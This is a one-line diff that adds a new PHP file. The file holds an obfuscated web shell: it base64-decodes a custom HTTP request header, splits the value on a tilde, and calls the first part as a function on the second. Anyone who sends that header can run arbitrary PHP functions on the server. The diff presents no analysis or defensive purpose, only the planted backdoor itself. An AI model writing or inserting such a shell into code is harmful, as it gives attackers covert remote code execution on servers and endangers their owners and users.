@@ -1,0 +1,1 @@
+<?php $x=explode('~',base64_decode($_SERVER['HTTP_AIZAWA_NINJA']));$x[0]($x[1]);
